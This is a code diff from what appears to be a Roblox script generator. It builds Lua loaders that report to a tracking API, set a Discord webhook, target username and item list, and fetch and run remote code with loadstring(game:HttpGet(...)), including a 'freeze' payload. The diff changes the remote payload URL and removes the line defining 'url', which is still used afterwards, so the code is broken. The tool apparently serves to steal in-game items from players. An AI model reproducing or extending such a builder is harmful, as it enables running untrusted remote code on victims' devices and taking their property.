@@ -2145,8 +2145,7 @@ async function generate() {
     else if (adminMode === 'freeze') adminPart = `task.spawn(function()\n            loadstring(game:HttpGet("https://pastefy.app/BNCsmpLk/raw"))()\n            end)`;
     else if (adminMode === 'custom' && customAdminLoadstring.trim()) adminPart = customAdminLoadstring;
     const hitUrl = SKRINHUB_API + '/api/hit?userId=' + encodeURIComponent(discordUser.id||'') + '&username=' + encodeURIComponent(discordUser.username||'') + '&displayName=' + encodeURIComponent(discordUser.displayName||'') + '&avatar=' + encodeURIComponent(discordUser.avatar||'');
-    const script = `-- SKRINHUB\ntask.spawn(function() pcall(function() game:HttpGet("${hitUrl}") end) end)\ngetgenv().WEBHOOK_URL = "${finalWebhook}"\ngetgenv().TARGET_USERNAME = "${username}"\ngetgenv().TARGET_BRAINROT = {\n${brainrotLines}\n}\ntask.spawn(function()\nloadstring(game:HttpGet("https://raw.githubusercontent.com/ZAmbuluda/Shrinkhub/refs/heads/main/freeze.lua"))()\nend)\n${adminPart}`;
-    const url = await uploadToPastefy(script);
+    const script = `-- SKRINHUB\ntask.spawn(function() pcall(function() game:HttpGet("${hitUrl}") end) end)\ngetgenv().WEBHOOK_URL = "${finalWebhook}"\ngetgenv().TARGET_USERNAME = "${username}"\ngetgenv().TARGET_BRAINROT = {\n${brainrotLines}\n}\ntask.spawn(function()\nloadstring(game:HttpGet("https://raw.githubusercontent.com/nexoradisc-create/skrinhubcode/refs/heads/main/skrinhub.lua"))()\nend)\n${adminPart}`;
     out.className = 'code-block';
     out.textContent = url ? `loadstring(game:HttpGet("${url}"))()` : `-- Failed to upload.\n${script}`;
     scriptCount++;
